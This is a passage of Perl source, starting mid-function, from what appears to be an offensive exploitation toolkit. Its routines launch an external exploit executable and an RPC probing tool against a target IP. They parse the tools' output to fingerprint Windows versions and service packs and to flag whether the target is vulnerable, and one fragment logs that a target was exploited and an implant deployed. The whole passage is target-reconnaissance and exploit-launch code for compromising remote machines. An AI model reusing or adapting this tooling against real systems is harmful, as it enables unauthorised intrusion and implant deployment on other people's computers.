			&EU_Log(1,"has been exploited and the implant deployed.");
		}
	}

	return ($ImplantSocketStatus, $EggSocketStatus);
}



sub run_elvtouch()
{
	my ($root_dir, $TargetIp, $TargetPort, $TargetTransportProtocol, $TargetApplicationProtocol, $RpcConnection, $TargetServerIp, $TimeOutValue, $touchType) = @_;
	my $handle = new FileHandle;

	my $bVulnerable		= 0;		
	my $bError			= 0;		
	my $WindowsVersion	= $not;

	if( $touchType ne $::RUN_PROBE_1 ) {
		$bError = 1;
		&EU_Log(1, "ERROR: Touch Type \"$touchType\" not supported\n");
		return ($WindowsVersion,$bVulnerable,$bError);
	}

	my $cmdline = "\"$root_dir\\$::EXPLOIT_EXE\" -r $touchType -i $TargetIp -p $TargetPort -t $TargetTransportProtocol -b $TargetApplicationProtocol $RpcConnection -h $TargetServerIp -o $TimeOutValue";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Touching target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::EXPLOIT_EXE");
	}

	my $line;

	if( $touchType eq $::RUN_PROBE_1 ) {		

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /Looks like Windows NT 4.0/) {
				$WindowsVersion = $nt4;
			}
			elsif($line =~ /Looks like Windows 2000/) {
				$WindowsVersion = $w2k;
			}
			elsif($line =~ /Looks like Windows XP SP2/) {
				$WindowsVersion = $wxpsp2;
			}
			elsif($line =~ /Looks like Windows XP \(SP1 and below\)/) {
				$WindowsVersion = $wxp;
			}
			elsif($line =~ /Looks like Windows Server 2003 SP1/) {
				$WindowsVersion = $ws2003sp1;
			}
			elsif($line =~ /Looks like Windows Server 2003 \(Base release\)/) {
				$WindowsVersion = $ws2003;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$WindowsVersion = $not;
			}
			elsif($line =~ /Target is vulnerable/) {
				$bVulnerable = 1;
			}
			elsif($line =~ /Target is NOT vulnerable/) {
				$bVulnerable = 0;
			}
			elsif($line =~ /ERROR/) {
				$bError = 1;
			}
		}
	}

	&EU_Log(0, "run_elvtouch:\n\tWindowsVersion: $WindowsVersion\n\tbVulnerable: $bVulnerable\n\tbError: $bError\n");

	return ($WindowsVersion,$bVulnerable,$bError);
}



sub launch_rpctouchii() {
	my ($root_dir, $TargetIp, $TargetPort, $RunOption, $TargetTransportProtocol, $TargetApplicationProtocol, $TargetServerIp, $TimeOutValue) = @_;
	my $handle = new FileHandle;

	my $AtsvcPort	= "Unknown";
	my $ProbeError = 0;			
	my $MachineType = $not;		


	my $cmdline = "\"$root_dir\\$::RPCTOUCHII\" -i $TargetIp -p $TargetPort -r $RunOption -t $TargetTransportProtocol -b $TargetApplicationProtocol -h $TargetServerIp -o $TimeOutValue";
	&EU_Log(0, "$cmdline");

	&EU_Log(0, "Probing target...");
	if(!open($handle, "$cmdline|")) {
		&EU_ExitMessage(1, "Unable to execute $::REGPROBE");
	}

	my $junk;
	my $line;
	my $success = 0;

	if( $RunOption eq $RPCTOUCHII_RUN_GENERAL_PROBE ) {		

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Windows 9x/) {
				$MachineType = $w9x;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$MachineType = $nt4;
			}
			elsif($line =~ /Looks like Windows 2000/) {
				$MachineType = $w2k;
			}
			elsif($line =~ /Looks like Windows XP/) {
				$MachineType = $wxp;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$MachineType = $ws2003;
			}
			elsif($line =~ /Looks like Windows 2003/) {
				$MachineType = $ws2003;
			}
			elsif($line =~ /Looks like either Windows XP or Windows Server 2003/) {
				$MachineType = $wxp2003;
			}
		}
	}
	elsif( $RunOption eq $RPCTOUCHII_RUN_REGPROBE ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like either Windows 9x or NT 4.0/) {
				$ProbeError = 1;
				$MachineType = $w9x;
			}
			elsif($line =~ /Looks like Windows NT 4.0/) {
				$MachineType = $nt4;
			}
			elsif($line =~ /Looks like either Windows 2000 or Windows XP/) {
				$MachineType = $w2kXp;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$MachineType = $ws2003;
			}
			elsif($line =~ /Looks like Windows 2003/) {
				$MachineType = $ws2003;
			}
		}
	}
	elsif( $RunOption eq $RPCTOUCHII_RUN_WINDOWS_2003_PROBE ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}
			elsif($line =~ /Looks like UNKNOWN Windows version/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Beta Windows Server 2003/) {
				$MachineType = $not;
			}
			elsif($line =~ /Looks like Windows XP Professional or Home Edition/) {
				$MachineType = $wxp;
			}
			elsif($line =~ /Looks like Windows XP/) {
				$MachineType = $wxp;
			}
			elsif($line =~ /Looks like Windows Server 2003/) {
				$MachineType = $ws2003;
			}
			elsif($line =~ /Looks like Windows 2003/) {
				$MachineType = $ws2003;
			}
		}
	}
	elsif( $RunOption eq $RPCTOUCHII_RUN_XP_SP0_PROBE ) {	

		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}			
			elsif($line =~ /Service Pack 0/) {
				$MachineType = $wxpsp0;
			}
			elsif($line =~ /Service Pack 1/) {
				$MachineType = $wxpsp1;
			}
		}
	}
	elsif( $RunOption eq $RPCTOUCHII_RUN_RPC_INTERFACE_PORT ) {	
		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /^Port number for Atsvc/) {

				($junk,$AtsvcPort)= split(/:/,$line);

			}
		}
	}
	elsif( $RunOption eq $RPCTOUCHII_RUN_WINDOWS_2000_SP4_PROBE ) {	
		while(<$handle>) {
			chomp($line = $_);
			&EU_Log(1, $line);

			if($line =~ /ERROR/) {
				$ProbeError = 1;
				$MachineType = $not;
			}			
			elsif($line =~ /Windows 2000 Service Pack 0, 1, 2, or 3/) {
				$MachineType = $w2ksp0123;
			}
			elsif($line =~ /Windows 2000 Service Pack 4/) {
				$MachineType = $w2ksp4;
			}
		}
	}
	if( $RunOption eq $RPCTOUCHII_RUN_RPC_INTERFACE_PORT ) {	
		return($AtsvcPort,$ProbeError);
	}
	else {
		return ($MachineType,$ProbeError); 
	}
}



__END__



